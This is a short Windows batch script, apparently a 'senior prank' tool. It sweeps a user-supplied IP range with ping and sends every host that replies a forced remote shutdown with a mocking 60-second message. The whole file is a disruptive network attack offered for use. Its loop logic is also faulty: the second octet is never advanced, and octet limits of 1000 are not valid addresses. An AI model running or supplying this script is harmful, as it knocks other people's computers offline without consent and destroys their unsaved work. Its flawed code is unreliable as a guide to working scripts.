@echo off
title Mass Shutdown
set /p baseip=Base IP:
set secondip=0
set thirdip=0

:loop
echo Searching for %baseip%.%secondip%.%thirdip%
If %thirdip%==1000 (goto tip)
ping -n 1 %baseip%.%secondip%.%thirdip% | find "TTL=" >nul
IF errorlevel 1 (goto tip)
echo Shutting down %baseip%.%secondip%.%thirdip%
shutdown -s -f -m \\%baseip%.%secondip%.%thirdip% -t 60 -c "%SENIOR PRANK!!! GOODBYE!!! Please save your work, you will be logged off in 60 seconds."

:tip
set /a thirdipset=%thirdip%+1
set thirdip=%thirdipset%
goto loop


:sip
If %secondip%==1000 (goto q)
set /a secondipset=%secondip%+1
set secondip=%secondipset%
set thirdip=0
goto loop

:q
echo Finished
ping -n 2 127.0.0.1 >nul